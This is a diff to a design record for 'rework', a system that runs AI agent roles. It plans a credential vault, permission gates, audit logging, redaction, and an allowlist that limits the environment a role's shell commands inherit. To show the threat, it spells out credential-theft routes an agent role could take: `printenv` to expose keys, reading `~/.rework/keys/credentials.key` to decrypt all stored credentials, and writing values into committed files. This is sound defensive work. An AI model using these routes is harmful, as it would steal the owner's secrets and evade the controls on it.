@@ -37,7 +37,12 @@ no mechanical brake on it. What exists today:
 - **The jail is advisory.** The `run_command` jail in `nodes/tools.py` is documented as
   advisory (quoted in section 8). The shell string is passed to `create_subprocess_shell`
   (`nodes/tools.py:208`) with the daemon's whole environment (`role_env`,
-  `nodes/tools.py:291`, `env = dict(os.environ)` at `:308`).
+  `nodes/tools.py:291`, `env = dict(os.environ)` at `:308`). That is a second leak
+  channel, independent of the missing secret store: every `run_command` of every role can
+  `printenv` and read each provider key (`load_env_file` copies `~/.rework/rework.env`
+  into `os.environ`, `config.py:44-45`), `REWORK_DB` (a Postgres URL carries its
+  password) and anything else the daemon was started with, and print it into tool output,
+  logs and the model's context. Section 4 closes that channel.
 - **Permission gates exist, but nothing on the role execution path asks them.**
   `GateKind.PERMISSION` ("allow / deny -> approved bool", `kernel/state/records.py:58`)
   is asked today only by the orchestrator agent: a turn-cap gate marked
@@ -77,6 +82,10 @@ The owner has settled the following. This ADR designs around them and does not r
 5. `run_command` gets an editable destructive-command policy where ambiguous matches ask.
 6. Model provider API keys stay with the providers (`models.json`, `rework.env`) and are
    out of scope.
+7. (Added by the owner in the second audit round; it overrides an earlier draft that
+   recorded this as a known gap.) Role commands do not inherit the daemon's environment:
+   they get a built-in allowlist, everything else is dropped, and a credential's value is
+   added only for the one granted call (section 4).
 
 ## Decision
 
@@ -174,9 +183,12 @@ CREATE TABLE IF NOT EXISTS permission_audit (        -- append-only (section 7)
     action TEXT NOT NULL, outcome TEXT NOT NULL,
     rule_id TEXT, gate_id TEXT, env_name TEXT,
     command TEXT,                       -- already redacted
-    exit_code INTEGER, actor TEXT NOT NULL, detail TEXT NOT NULL DEFAULT ''
+    exit_code INTEGER, actor TEXT NOT NULL, detail TEXT NOT NULL DEFAULT '',
+    call_hash TEXT                      -- sha256(run_id | tool | canonical args JSON); lets the
+                                        -- replay design count attempts per call (section 7)
 );
 CREATE INDEX IF NOT EXISTS idx_audit_subject ON permission_audit(subject_id, ts);
+CREATE INDEX IF NOT EXISTS idx_audit_call ON permission_audit(run_id, call_hash);
 CREATE INDEX IF NOT EXISTS idx_audit_mission ON permission_audit(mission_id, ts);
 ```
 
@@ -248,14 +260,16 @@ never stored in the database, an env file, or any role's environment variable.
 **What does and does not protect that directory (read this before trusting it).** Only
 the file mode, and only against *other OS users*. `role_env` sets `REWORK_TARGETS`,
 `REWORK_ENV_FILE`, `REWORK_TUI_SETTINGS`, `REWORK_LOG_DIR` and `REWORK_RUN_DIR` to a
-per-run scratch directory (`nodes/tools.py:316-323`), but each is an
+per-run scratch directory (`nodes/tools.py:319-323`), but each is an
 `env.setdefault(...)`: a default that rework's own CLI would pick up if a command ran it.
-It hides nothing and restricts nothing on disk. A role runs as the daemon's OS user with
-the daemon's whole environment copied in (`role_env`, `nodes/tools.py:291`, `:308`) under
-an advisory jail (section 8). One `run_command` can therefore `cat
-~/.rework/keys/credentials.key`, find the database (`REWORK_DB`, or the default path,
-`config.py:91`) and decrypt every credential, with no policy check, no gate and no audit
-row. The key directory is **not** a boundary against a role; section 11 says so, and it
+It hides nothing and restricts nothing on disk. A role runs as the daemon's OS user under
+an advisory jail (section 8). Today it also has the daemon's whole environment copied in
+(`role_env`, `nodes/tools.py:291`, `:308`); section 4 closes that *environment* channel in
+phase 1 and only that channel, so the file channel below stays open. One `run_command` can
+therefore `cat ~/.rework/keys/credentials.key`, find the database (the default sqlite
+path, `config.py:68-69`, `:91`, or a Postgres URL kept in a file such as `rework.env`,
+`config.py:20-46`) and decrypt every credential, with no policy check, no gate and no
+audit row. The key directory is **not** a boundary against a role; section 11 says so, and it
 stays true until the key is owned by something a role cannot read: a Docker executor (M7)
 or a separate OS user for the daemon. *Optional and advisory only:* the default command
 rules (section 8) may include a `deny` rule on argv that mention `~/.rework/keys` or
@@ -270,9 +284,10 @@ that silently minted a new key after losing the old one would orphan every store
 
 **Public key distribution and pinning.** The public key is not secret; it lives in
 `credential_keys`, so a TUI on any machine reads it from the shared store (ADR 0006,
-"Store-only"). Because a writer to the DB could substitute their own public key, the TUI
-pins the fingerprint on first use in `~/.rework/keys/pinned` and shows a blocking
-"the credential key changed" prompt on mismatch. `rework keys fingerprint` prints the key
+"Store-only"). Because a writer to the DB could substitute their own public key, the encrypting side
+pins the fingerprint on first use in `~/.rework/keys/pinned`. The shared encrypt helper
+used by `rework credential add|rotate` on any machine (phase 1) refuses to encrypt on a
+mismatch; the TUI (phase 3) shows a blocking "the credential key changed" prompt instead. `rework keys fingerprint` prints the key
 id on rewvis for out-of-band comparison.
 
 **Backup and restore.** `rework keys export <file>` writes the private key wrapped under
@@ -302,9 +317,14 @@ The agent calls a new tool `credential_propose(name, description, how_to_use, en
 proposed_policy)`. rework creates the item `PROPOSED` with no envelope plus a
 `permission_policies` row `source='agent_proposed', status='proposed'`, and opens a
 `GateKind.PERMISSION` gate (section 7) whose `spec` carries the proposed scope and
-approval mode. The owner reviews, edits the policy if they wish, and decides. On Allow the
-TUI asks for the value in the masked field, encrypts it client-side, and flips item and
-policy to `ACTIVE`/`active`. On Deny the proposal is `RETIRED`. Until a value exists the
+approval mode. The owner reviews, edits the policy if they wish, and decides on the
+existing Allow / Deny gate screen (`tui/views/gates.py:48`); editing the proposed policy is
+`rework permissions edit` until the TUI policy editor exists (phase 3). On Allow the owner
+enters the value: with `rework credential rotate NAME` (on an item with no envelope it sets
+the first value, read by masked `getpass`; the command exists from phase 1, the proposal flow it serves from phase 2) or, from phase 3, in the TUI's masked
+field, which encrypts client-side. Item and policy flip to `ACTIVE`/`active` when that
+first value is stored, and only if the proposal's gate was approved. On Deny the proposal
+is `RETIRED`. Until a value exists the
 credential resolves as `unavailable: no value set`. If an agent has found a secret in the
 repo, it reports where; the owner decides whether to register it.
 
@@ -314,7 +334,7 @@ States and consequences:
 | state | what happens |
 |---|---|
 | private key file present, key id found | normal |
-| private key file missing / unreadable | vault is `locked`: every credential resolves `unavailable: private key missing on this host`; one WARNING at start and a banner in the TUI Library view |
+| private key file missing / unreadable | vault is `locked`: every credential resolves `unavailable: private key missing on this host`; one WARNING at start (phase 1) and a banner in the TUI Library view (phase 3) |
 | envelope key id not held by this host | that credential: `unavailable: encrypted to key <id>, which this host does not hold` |
 | GCM tag fails (tampered, wrong item, wrong key) | that credential: `unavailable: corrupt` plus an audit row |
 | unknown version / alg | `unavailable: unsupported envelope` |
@@ -338,7 +358,8 @@ the new wrapper is applied at those three sites, outside `library_executor`. It 
 outside because `LibraryAwareExecutor` answers `library_*` itself and never delegates them
 inward (`library/tools.py:224-238`); a wrapper inside it could not see `library_read`
 (section 6). The wrapper acts on exactly two tool names, `run_command` (this section) and
-`library_read` (section 6), and delegates every other call unchanged. `run_command`'s
+`library_read` (section 6; phase 1 delegates it unchanged, the policy check on it
+lands in phase 3), and delegates every other call unchanged. `run_command`'s
 `ToolSpec` in `nodes/tools.py` gains an optional `credentials: [name]` argument.
 
 1. **Request by name.** The model calls `run_command(command="gh pr list",
@@ -349,8 +370,10 @@ inward (`library/tools.py:224-238`); a wrapper inside it could not see `library_
    The names resolve through `LibraryHandle.resolve` (`library/tools.py:68-78`) and must be
    `type=credential`, `status=ACTIVE`.
 2. **Policy check** (section 6), including the destructive-command policy (section 8).
-   Result: allow, deny, or ask.
-3. **Gate if required** (section 7). The wrapper blocks the tool call like
+   Result: allow, deny, or ask. *Phase 1 evaluates steps 1-3 of section 6 and approval
+   `never` only: a rule that would ask is evaluated as deny, and there are no command
+   rules yet; the command policy and `ask` arrive in phase 2 (section 13).*
+3. **Gate if required** (section 7; phase 2, so in phase 1 this step never runs). The wrapper blocks the tool call like
    `ask_orchestrator` does (`nodes/escalate.py:1`, a blocking tool rather than an
    `interrupt()`), polling the gate row, which is the source of truth (CLAUDE.md hard
    rule 3).
@@ -360,12 +383,23 @@ inward (`library/tools.py:224-238`); a wrapper inside it could not see `library_
    private key (a fresh decrypt at use, not the resident redaction copy, so a rotated or
    corrupt envelope is caught here). Where the plaintext then lives, and for how long, is
    the single statement below.
-6. **Environment for that one command.** `env = role_env(workdir)` (`nodes/tools.py:214`)
-   plus `env[env_name] = value`, passed only as the `env=` of that one
-   `create_subprocess_shell` (`nodes/tools.py:208-215`). `os.environ` is never modified.
-   The value is never put in the command string, a file, `argv`, or the process title (so
-   `ps` shows nothing). Reserved names (`PATH`, `HOME`, `SHELL`, `LD_*`, `PYTHON*`,
-   `REWORK_*`) cannot be a credential's `env_name`; the vault refuses them at creation.
+6. **Environment for that one command.** The base is `role_env(workdir)`
+   (`nodes/tools.py:214`), which from phase 1 is the **allowlisted** environment (the
+   subsection below), never a copy of the daemon's. Only now, after steps 2-4 passed, does
+   the wrapper add `env[env_name] = value` for each granted credential, on top of that
+   base; a credential is never inherited. The value reaches the spawn site
+   (`nodes/tools.py:208-215`) through a per-call `ContextVar` that `PermissionExecutor`
+   sets around its inner `execute` and resets in a `finally`, and that `LocalExecutor`
+   reads once and merges into the `env=` of that one `create_subprocess_shell`. A model
+   cannot set it (it is not a tool argument; the wrapper removes `credentials` from the
+   args it delegates). `os.environ` is never modified. The value is never put in the
+   command string, a file, `argv`, or the process title (so `ps` shows nothing).
+   Reserved names (`PATH`, `HOME`, `SHELL`, `LD_*`, `PYTHON*`, `REWORK_*`) and any name on
+   the effective environment allowlist cannot be a credential's `env_name`: the vault
+   refuses them at creation, and step 1 re-checks at use (an allowlist edited later makes
+   that credential `unavailable: env_name is on the role environment allowlist`), because
+   a name the daemon environment passes to every command would defeat "visible in the one
+   granted call only".
 7. **Output through the redactor** (section 5), as bytes, before decode, truncation and
    return.
 8. **Audit `finished` row** with the exit code and the redacted command.
@@ -378,11 +412,15 @@ value exists only on the daemon host, in exactly three places:
    credential is rotated or retired (its needles are dropped on the next poll), or the
    vault locks. This is the longest-lived copy and it is unavoidable: the redactor can
    only remove values it holds.
-2. **One local variable in `PermissionExecutor`**, from the decrypt in step 5 to the return
-   of that call. The wrapper drops the reference in a `finally`.
+2. **`PermissionExecutor`'s one local variable, the per-call `ContextVar` that carries it to
+   the spawn site, and the merged `env` dict `LocalExecutor` builds for that spawn**, from
+   the decrypt in step 5 to the return of that call. The wrapper drops the variable and
+   resets the `ContextVar` in a `finally`; the merged dict is a local of the spawn and
+   dies with it.
 3. **The child process's environment block**, for as long as that process and any
-   descendants live. The timeout path kills the whole process group (`_kill_tree`,
-   `nodes/tools.py:220`); a command that backgrounds itself (`nohup ... &`) keeps it.
+   descendants live. The timeout path kills the whole process group (`_kill_tree`, defined
+   at `nodes/tools.py:423`, called at `:220`); a command that backgrounds itself
+   (`nohup ... &`) keeps it.
 
 *What wipes:* only dropping references (the call's local at return; the needle entries on
 rotate, retire or lock). *What cannot be wiped:* CPython `str`/`bytes` objects are not
@@ -398,8 +436,137 @@ credential *names* and the command string (`_short_args`, `nodes/toolloop.py:34-
 renders every argument, including `command`), the value is in neither, and the command
 string is itself redacted at the hooks in section 5.
 
-A command a role leaves running in the background (`nohup ... &`) keeps its environment;
-that is inherent to environment injection and is covered under limits.
+A command a role leaves running in the background keeps its environment: item 3 above and
+the section 11 row for the child process; it is inherent to environment injection.
+
+**The role environment is an allowlist, not an inheritance (ships in phase 1).**
+Today `role_env` starts from `env = dict(os.environ)` (`nodes/tools.py:308`) and every
+`run_command` of every role gets the result, through the one spawn site
+(`nodes/tools.py:208-215`) that all four `LocalExecutor` construction sites reach
+(`nodes/tools.py:101`, `nodes/git_ops.py:243`, `roles/builtin/auditor.py:117`,
+`roles/builtin/investigator.py:110`). The owner's requirement is that this channel is
+closed, so the environment a role command receives is *built*, not filtered:
+
+- **(a) Baseline allowlist, everything else dropped.** `role_env` starts from an empty
+  dict and copies a variable from the daemon's environment only if its name is on the
+  allowlist: the built-in baseline below plus the owner's list. The `dict(os.environ)`
+  line is deleted, not guarded. There is no "unless it looks safe" rule, no pattern such
+  as `*KEY*` or `*TOKEN*` that decides to keep or drop, and no branch that falls through
+  to the parent environment, including on error (below).
+
+  | group | names (exact, case-sensitive) |
+  |---|---|
+  | process basics | `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`, `TMPDIR`, `TZ` |
+  | locale and terminal | `LANG`, `LANGUAGE`, `TERM`, and the prefix `LC_*` |
+  | XDG directories (paths only) | `XDG_CACHE_HOME`, `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `XDG_STATE_HOME` |
+  | git identity | the prefixes `GIT_AUTHOR_*` and `GIT_COMMITTER_*` |
+  | uv and python behaviour (paths and switches, never URLs) | `UV_CACHE_DIR`, `UV_PYTHON`, `UV_PYTHON_INSTALL_DIR`, `PYTHONUNBUFFERED`, `PYTHONDONTWRITEBYTECODE`, `PYTHONUTF8`, `PYTHONIOENCODING` |
+  | rework scratch redirects, **set** by `role_env`, never inherited | `REWORK_TARGETS`, `REWORK_ENV_FILE`, `REWORK_TUI_SETTINGS`, `REWORK_LOG_DIR`, `REWORK_RUN_DIR` (pointing into `scratch_dir(workdir)`, `nodes/tools.py:264`) |
+
+  Deliberately **not** on the baseline: `GIT_SSH_COMMAND` (it picks which key file git
+  pushes as, and `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_*`/`GIT_CONFIG_VALUE_*` can inject an
+  `http.extraheader` carrying a token; so are `GIT_ASKPASS` and every other `GIT_*`),
+  `PYTHONPATH`, `PYTHONHOME`, `VIRTUAL_ENV`, `VIRTUAL_ENV_PROMPT` (the daemon's venv must
+  not leak into a role; `role_env` already strips these for repos with a
+  `pyproject.toml`, and the allowlist now does it for every repo), `SSH_AUTH_SOCK`,
+  proxy variables, and every `REWORK_*` other than the five scratch redirects.
+
+  **The owner's list.** `~/.rework/role_env.toml` (`DEFAULT_STATE_DIR / "role_env.toml"`,
+  `config.py:17`), TOML like `targets.toml` (`targets.py:47`), one key:
+
+  ```toml
+  # exact names; a trailing * makes a prefix. Everything not listed here or in the
+  # built-in baseline is dropped from role commands.
+  allow = ["SSH_AUTH_SOCK", "HTTPS_PROXY", "https_proxy", "UV_INDEX_*", "REWORK_TEST_POSTGRES"]
+  ```
+
+  The daemon re-reads it when its mtime changes, so an edit applies to the next command
+  without a restart. A missing file means baseline only. A file that is unreadable, is not
+  valid TOML, has `allow` that is not a list of strings, or contains a bare `*`, an empty
+  string or a prefix shorter than three characters is ignored **as a whole** (baseline
+  only, one ERROR log per mtime): every failure moves toward fewer variables, never more,
+  and there is deliberately no `inherit_all` switch. `rework role-env show` prints the
+  effective allowlist and, by name only, which variables are being dropped from **its own**
+  environment plus the keys of `~/.rework/rework.env` (which the daemon loads,
+  `config.py:20-46`). It cannot see the daemon's real environment (a systemd unit's
+  `Environment=` lines are not in the owner's shell), so the daemon also logs the dropped
+  names, never values, once at start. `rework role-env allow NAME` appends an entry. At daemon start and on each
+  edit, an owner entry that names a variable rework knows is secret (`REWORK_*_KEY`, an
+  `api_key_env` of `models.json`, `REWORK_DB`, `REWORK_TOKEN`, a registered credential's
+  `env_name`) logs a WARNING that it is now visible to every role command. That warns on an
+  explicit owner decision; it filters nothing.
+- **(b) Credentials are added per command, after the gate, on top of the base.** Step 6
+  above: the allowlisted base first, then the granted credential's `env_name` for that one
+  call, only after steps 2-4 passed. A credential value is never read from the parent
+  environment, and a variable of the same name in the daemon's environment is dropped like
+  any other.
+- **(c) What changes in `role_env` itself.** (1) The allowlist is built before anything
+  else, so it also applies on the early return for a repo with no `pyproject.toml`
+  (`nodes/tools.py:325`, `if workdir is not None and not (workdir / "pyproject.toml").exists()`),
+  which today returns the whole inherited environment. (2) The five scratch redirects
+  become plain assignments instead of `env.setdefault(...)` (`nodes/tools.py:319-323`):
+  with nothing inherited there is nothing to defer to. (3) The venv stripping still reads
+  `VIRTUAL_ENV` and `sys.prefix` from the daemon to know which `PATH` entries to remove,
+  but never copies `VIRTUAL_ENV` into the child. (4) An existing test asserts the old
+  inheritance: `test_a_plain_repo_keeps_the_daemons_tools`
+  (`tests/unit/test_nodes.py:359-366`) expects `$VIRTUAL_ENV` to be visible in a plain
+  repo. Phase 1 rewrites it: a toy repo keeps the daemon's *tools* through `PATH`, not
+  through `VIRTUAL_ENV`. `test_role_commands_do_not_inherit_the_daemons_venv`
+  (`:334-356`) and the scratch-dir tests (`:528` onward) should pass unchanged. A search of
+  `tests/unit/test_nodes.py` finds `setenv` in only those two tests (`:344-346`, `:364`); the
+  `delenv` calls at `:542` and `:639` only remove variables and are unaffected. Phase 1 runs
+  the whole suite to find any other test that relies on an inherited variable.
+- **(d) This closes the ENVIRONMENT channel only, not the FILE channel.** A role still
+  runs as the daemon's OS user. The private key file (section 3), the default database
+  path (`config.py:68-69`, `:91`), `~/.rework/rework.env` (which holds provider keys),
+  `~/.rework/role_env.toml` itself, and any token a tool keeps on disk under `HOME` (for
+  example `gh`'s own login, or private keys in `~/.ssh`) stay readable to a role. That is the
+  section 11 "does not protect" story, unchanged; nothing in this subsection contradicts it, and it must not be
+  read as "roles can no longer reach secrets".
+- **(e) Provider keys stay with the providers (section 10).** The allowlist removes them
+  from the role environment; it does not move them into the Library, encrypt them or put
+  them behind the permission system. The redactor's redact-only needles for them
+  (section 5) are therefore **belt-and-braces**, not the only defence: they catch a key a
+  role read from a file, or one the owner deliberately re-adds to the allowlist.
+- **(f) What will break, stated honestly.** Daemon-side subprocesses are not role commands
+  and keep the daemon's environment: `gh pr create` (`nodes/gh.py:15-55`), the notify command
+  (`kernel/gates.py:47-62`, which passes `{**os.environ, ...}`), previews, and the engine's own
+  git calls, which use `create_subprocess_exec` with no `env=` (`git_ops._run`,
+  `nodes/git_ops.py:15-28`, so `push_branch` and `clone_origin` still see the daemon's
+  `SSH_AUTH_SOCK` and git config). Only the `LocalExecutor` spawn is allowlisted
+  (`git_ops.worktree_executor`, `:243`, is the coder's executor, not the engine's git). The
+  engine's own PR creation and pushes are therefore unaffected.
+  For role commands:
+  - **An exported `GH_TOKEN` (or `GITHUB_TOKEN`) stops reaching a role's `gh`** until it is
+    registered as a credential with that `env_name` and an allow rule. A `gh` that is
+    logged in through its own config file under `HOME` keeps working, with no credential
+    and no audit row (the file channel, point d). `docs/ops.md:121-122` documents `gh auth
+    status` logged in as the setup, which is the config-file case, so for the owner's
+    deployment this is the likelier one. The phase 1 live exit criterion is written around
+    exactly this (section 13).
+  - **Verified in the source as used by existing code:** `PATH` (`role_env` itself reads it);
+    `uv run` in role worktrees (`gc.py` module docstring) needs `HOME` and uv's cache,
+    both on the baseline; the Postgres test suite reads `REWORK_TEST_POSTGRES`
+    (`tests/conftest.py:26-29`, `.github/workflows/ci.yml:44`), so a role cannot run it
+    against Postgres until the owner adds that name to `role_env.toml`. It carries a
+    password, and a `REWORK_*` name cannot be a credential's `env_name`, so allowlisting
+    it is the only route and is the owner's explicit trade; a role that runs the `rework`
+    CLI relies on `REWORK_DB`, `REWORK_TOKEN`, `REWORK_DAEMON_URL`, `REWORK_HTTP_PORT`
+    (`config.py:91`, `cli/__init__.py:254`, `orchestrator/workspace.py:104`, `:188-189`),
+    all dropped: with them gone the CLI falls back to the default sqlite path
+    (`config.py:68-69`), which for a Postgres daemon is a different database.
+  - **Not read by any rework source, but plausible for the commands roles run, so the
+    owner must add them if needed** (none is on the baseline; the grep of `src/rework`
+    for `GH_TOKEN`, `SSH_AUTH_SOCK`, proxy variables and `UV_*` reads found none, the only
+    `UV_` hit being the constant `UV_TIMEOUT_S`, `update.py:32`): `SSH_AUTH_SOCK` (an agent
+    socket is a capability, not a path, which is why it is opt-in), `GIT_SSH_COMMAND`,
+    `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` and lowercase forms (a proxy URL can embed a
+    password; without them a role on a proxied host loses network access), `SSL_CERT_FILE`
+    and `REQUESTS_CA_BUNDLE`, `UV_INDEX_*`/`PIP_*` (index URLs can embed tokens), and
+    any `*_TOKEN` a project's tests expect.
+- **(g) Named tests, in phase 1** (section 13): `test_role_command_cannot_see_provider_keys_or_db`
+  and `test_injected_credential_visible_only_in_the_granted_call`, plus the allowlist
+  unit tests listed there.
 
 ### 5. Redaction
 
@@ -416,7 +583,10 @@ vault that is `locked` holds no credential needles (the WARNING says so). (b) Va
 duration of the call even if (a) missed them. (c) The provider keys: the values of the
 variables named by `api_key_env` in `models.json` (`kernel/llm/catalog.py:33`, `:60`) and
 of every `REWORK_*_KEY` in the environment, as **redact-only** needles. They stay where
-they are (section 10).
+they are (section 10). Since the section 4 allowlist a role command no longer inherits
+them, so these needles are belt-and-braces: they catch a key read from a file, or one the
+owner re-adds to the allowlist, and are no longer the only thing between a role and a
+provider key in its environment.
 
 **How values are matched.** Each value `v` of length >= 8 yields needles:
 
@@ -481,11 +651,11 @@ Remedy when that fails is the provider-side one: rotate the secret.
 | every event | `InProcessEventBus.publish` (`kernel/events/bus.py:37`) | `redact_json(event.payload)` before `append_event` |
 | persisted records | `StateStore` is a Protocol (`kernel/state/store.py`); `append_event`, `create_gate`, `decide_gate`, run artifact via `update_run`, `append_chat_message` | a `RedactingStore` decorator around either backend, applied where the store is opened, so SQLite and Postgres get it once |
 | logs | `JsonFormatter.format` (`logs.py:60-79`) and the console formatter (`logs.py:106`) | redact `msg` and `exc` |
-| reports | `_render_md` (`cli/__init__.py:582`) and the TUI's report render | redact the rendered text |
+| reports | `_render_md` (`cli/__init__.py:582`) and the TUI's report render | redact the rendered text (the `_render_md` side in phase 1; the TUI render in phase 3) |
 | Library writes | `curation.contribute` (`library/curation.py:152`), before `write_body` (`:215-217`) | redact `body`/`description`: reports and memories are written to the mirrored repo |
 | PR title/body | `engine._create_pr` (`orchestrator/engine.py:758`), `pr_create` (`nodes/gh.py:15-55`; title and body are argv at `:33-36`) | last-mile `redact_text(title)`, `redact_text(body)` in `_create_pr` before it calls `pr_create` |
 | chat to the model | `OrchestratorChat.send` (`orchestrator/chat.py:405`), `_history` (`:434`), recorded at `:437` | the detector refuses a pasted secret before `:431`; stored and displayed text is redacted by value **only where the process holds values** (see the next subsection for a host that does not) |
-| TUI transcript | `tui/views/work.py:465` and the gate/report views | redact on render too (defense in depth; on a host without values this is the shape rules only, below) |
+| TUI transcript | `tui/views/work.py:465` and the gate/report views | redact on render too (defense in depth; on a host without values this is the shape rules only, below); this hook is TUI work and lands in phase 3 |
 
 **Streaming vs buffered.** `run_command` buffers the whole output (`communicate()`), so
 matching is over a complete buffer and needs no state. Any future streaming path must hold
@@ -501,9 +671,10 @@ later `decode(errors="replace")` (`nodes/tools.py:227`) means an encoding of the
 inside compressed or non-UTF-8 data is not recognized. Truncated output is redacted
 first, so truncation cannot split a value; partial needles catch fragments from another
 cutter. Redaction is a safety net behind "the model never has the value", not the primary
-control.
+control; for the environment channel the primary control is the allowlist (section 4).
 
-**Commit contents: the pre-push scan covers every engine push path.** A command could
+**Commit contents: the pre-push scan covers every engine push path (phase 2: it opens a
+gate, which phase 1 does not have).** A command could
 write a value into a file (`printenv > x`) that the handoff then commits. The engine pushes
 a branch from exactly two places, and both end in `git_ops.push_branch`
 (`nodes/git_ops.py:225`): `_deliver_branch` (`orchestrator/engine.py:630`, pushes at
@@ -561,12 +732,26 @@ recognises values rework holds and shapes the detector knows (the limits above).
   asking. A dimension that lists specific values never matches a request that has no
   value for it (`None`; the MCP server, below); only `"*"` does.
 - **Malformed rules fail closed, in the direction that denies.** A rule is malformed when
-  a scope key is missing or unknown, the JSON does not parse, `subject_id` is NULL, or
-  the combination is invalid. Saving one is rejected. If one is found in the table: a
-  malformed `allow`/`ask` rule is **non-matching** (so the default denies), and a malformed
-  `deny` rule **matches every request for its `subject_type`** (an unreadable deny must not
-  silently become no rule). Only `status='active'` rows are evaluated; `proposed` and
-  `retired` rows never match.
+  a scope key is missing or unknown, the JSON of `scope` or `matcher` does not parse,
+  `subject_id` is NULL, or the combination is invalid (for example `effect=allow` on a
+  command rule). Saving one is rejected. If one is found in the table, what "closed" means
+  depends on the subject, because the two defaults differ (next subsection):
+  - **Credential, skill and tool subjects (default deny).** A malformed `allow`/`ask` rule
+    is **non-matching**, so the default denies. A malformed `deny` rule **matches every
+    request for its `subject_type`** (an unreadable deny must not silently become no rule).
+  - **Command subjects (default allow, a denylist).** "Non-matching, so the default
+    denies" is **false here**: the default is allow, so a non-matching malformed `ask` rule
+    (a hand edit, a corrupt matcher, including the seeded `git push --force`) would
+    silently become no rule and the command would run ungated. So for commands **a
+    malformed rule is a hit, never a miss**: a malformed `deny` rule is a deny-class hit
+    and a malformed `ask` rule is an ask-class hit, on every `run_command`, because the
+    matcher that said which commands it meant is exactly what cannot be read and so cannot
+    be narrowed. A command rule whose `effect` itself cannot be read cannot be classed as
+    ask or deny, and is treated as deny-class (the stricter). The gate or denial names it (`rule <id> is malformed`). This is noisy on
+    purpose: it stays noisy until the owner repairs it with `rework permissions list
+    --malformed` then `edit` or `retire`, or `rework permissions reset-defaults --repair`
+    (which replaces a malformed `source='default'` row from the shipped seed).
+  Only `status='active'` rows are evaluated; `proposed` and `retired` rows never match.
 
 **Two kinds of subject, two defaults.** This resolves the apparent conflict between "no
 matching rule means deny" and "an ordinary command is not asked about":
@@ -604,9 +789,14 @@ evaluation *of that subject*:
      concrete item id). The grant covers any later command of that subject in that
      mission within scope; `every_use` exists for the owner who wants each command seen.
    - `every_use`: ask.
-5. **Command policy** (section 8): for every `run_command`, with or without credentials,
-   match the command against active `command` rules. `deny`: deny. `ask`: ask. No match:
-   no restriction from this step (allowed).
+5. **Command policy** (section 8; phase 2, there are no command rules in phase 1): for
+   every `run_command`, with or without credentials,
+   match the command against active `command` rules. `deny`: deny. `ask`: ask. A malformed
+   rule is a hit of its own class (above). No match, **after a successful read of the
+   rules**: no restriction from this step (allowed). An error reading the command rules
+   (database error, unknown rule shape the loader cannot classify) **denies the call**
+   (`denied: command policy unreadable`), including a plain `ls`. There is no cached
+   last-known-good rule set to fall back on, because a stale cache is a fail-open path.
 
 **Combining.** `deny` from any subject or from the command policy denies the call.
 Otherwise, if any subject or the command policy says `ask`, **one** gate is opened
@@ -617,9 +807,13 @@ with that reason; the command is not run without it.
 **Fails closed at each step.** Step 1: undecryptable means unavailable, never "try without
 it". Steps 2-3: any error reading policy (DB error, unknown subject type) denies with the
 reason, never allows; a malformed rule resolves as described above. Step 4: a missing or
-unreadable grant row asks. The audit write failing denies. A gate that times out or whose
-owner cannot be reached denies (section 7). There is no code path from an error to an
-allow.
+unreadable grant row asks. **Step 5 (command policy):** an error reading the command rules
+denies, and a malformed command rule is a deny or ask hit; step 5 is the one place where
+"found nothing" means allow, so it is the one place where a failed read is checked
+separately from an empty result (an empty result after a successful read is allowed, a
+failed read is not an empty result). The grant lookup failing asks, and the audit write
+failing denies. A gate that times out or whose owner cannot be reached denies (section 7).
+There is no code path from an error to an allow.
 
 **Skills and tools: what "use" means, and where it is enforced.** A skill is a
 procedure and a Library tool is a body of code the agent then runs through `run_command`;
@@ -682,14 +876,31 @@ interface sees only `(name, args)`, not the tool-call id (`executor.execute(tc.n
 dict(tc.arguments))`, `nodes/toolloop.py:420`), and `GateManager.request` mints a random
 gate id (`kernel/gates.py:99`), so the id cannot be derived. The wrapper therefore uses the
 existing lookup pattern (`spec["_call"]`, `orchestrator/agent.py:1232-1240`): it computes
-`call_key = sha256(run_id | tool name | canonical args JSON | k)` where `k` is the number
-of `use`/`started` audit rows already written for the same run and same `(tool name,
-args)`, stores it in `spec["permission"]["call_key"]`, and before opening a gate looks
-through `list_gates(mission)` for a PERMISSION gate with that key. An `open` gate is
-waited on; a decided gate with no `started` row yet is **unconsumed** and is reused (its
-decision is honoured); a gate whose `started` row exists has been consumed, `k` has
+`call_hash = sha256(run_id | tool name | canonical args JSON)` (the `call_hash` column of
+every audit row) and `call_key = sha256(call_hash | k)`, where `k` is the number of
+**terminal** audit rows already written with that `call_hash`. A terminal row is one whose
+outcome is `started` (or `allowed`, for a `library_read` that has no started/finished
+pair), `denied` or `timed_out`. The wrapper stores `call_key` in
+`spec["permission"]["call_key"]` and, before opening a gate, looks through
+`list_gates(mission)` for a PERMISSION gate with that key. An `open` gate is waited on; a
+decided gate with no terminal row yet is **unconsumed** and is reused, and its decision is
+honoured (Allow: write `started` and run; Deny or timeout: write the `denied`/`timed_out`
+row and return the refusal). Once a terminal row exists the gate is consumed, `k` has
 advanced, and the next identical command needs a fresh gate. So a restart never opens a
-second gate for the same pending call, and an approval is never spent twice.
+second gate for the same pending call, and a decision is never spent twice.
+
+**Decision: a denial is not sticky; a retry asks again.** Counting `denied` and
+`timed_out` rows in `k` is a deliberate choice. A gate answers "may this run this command
+now", not "may it ever". If a denied or timed-out gate stayed unconsumed, every later
+identical command in the run would be refused forever with no new gate, and the owner
+could never change their mind (or come back from being away: a timeout would become a
+permanent refusal) short of aborting the run. The cost is that a model that loops on the
+same command asks again each time; that is bounded by the tool loop's own turn budget and
+softened by the owner's note, which is returned in `denied: <note>` ("do not retry, use
+X"). An owner who wants a standing no writes a `deny` rule (section 6, step 2), which
+needs no gate and is the sticky mechanism by design. The one case where a denial is
+re-served rather than re-asked is the crash window between the decision and the terminal
+row, and the case where the audit write itself fails (which denies the call anyway).
 
 **Where the payload rides: `spec`, no migration.** The gates table has no scope or
 resource columns, and the decision is to leave it that way:
@@ -730,16 +941,19 @@ timeout the wrapper records `decision_note="timed out"`, status denied, and retu
 `denied: permission gate timed out; the command was not run`. On deny it returns
 `denied: <note>`; on run abort (the run row no longer running) it returns the same stop
 message `ask_orchestrator` uses. In every case the command is not executed, an audit row
-records `denied` or `timed_out`, and the model sees a plain refusal with no hint of the
-value or how to bypass.
+records `denied` or `timed_out` (the terminal row that advances `k`, so a retry gets a
+fresh gate, above), and the model sees a plain refusal with no hint of the value or how
+to bypass.
 
 **Audit trail.** `permission_audit` (section 1) is append-only and written by the engine,
